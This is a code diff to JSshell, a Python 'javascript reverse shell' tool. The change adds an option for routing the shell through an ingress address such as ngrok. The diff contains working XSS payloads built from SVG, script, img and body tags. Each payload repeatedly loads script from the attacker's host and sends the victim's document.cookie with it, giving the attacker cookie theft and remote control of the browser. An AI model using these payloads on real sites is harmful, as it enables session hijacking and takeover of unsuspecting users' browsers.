@@ -32,9 +32,11 @@ parser = argparse.ArgumentParser(description='JSshell 3.1: javascript reverse sh
 parser.add_argument('-p', help='local port number (default: 4848)', dest='port', default=4848)
 parser.add_argument('-s', help='local source address', dest='host', default='')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
+parser.add_argument('-t', help='target address for ingress-as-a-server e.g. ngrok', dest='target', default=str())
 parser.add_argument('-c', help='command to execute after got shell', dest='command', default=str())
 parser.add_argument('-w', help='timeout for shell connection', dest='secs', type=float, default=0)
 parser.add_argument('-q', help='quiet mode', dest='quiet', action='store_true')
+
 
 args = parser.parse_args()
 
@@ -59,12 +61,22 @@ else:
 gene = args.gene
 cmd = format(args.command)
 secs = float(format(args.secs))
-payload = '''
- - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
- - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
- - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}}></body>
-'''.format(host, port)
+target = args.target
+
+if len(target) > 0 and gene:
+    payload = '''
+    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)>
+    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)</script>
+    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)>
+    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}/?"+document.cookie}},1010)></body>
+    '''.format(target)
+else:
+    payload = '''
+    - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
+    - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)</script>
+    - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
+    - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}}></body>
+    '''.format(host, port)
 
         
 form = b'''HTTP/1.1 200 OK
@@ -155,9 +167,10 @@ def main():
         quit()
 
     uprint(banner)
-    if gene == True:
-        uprint('%sPayloads:  %s' % (white, payload))
 
+    if gene:
+        uprint('%sPayloads:  %s' % (white, payload))
+    
     print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
 
     s.listen(2)
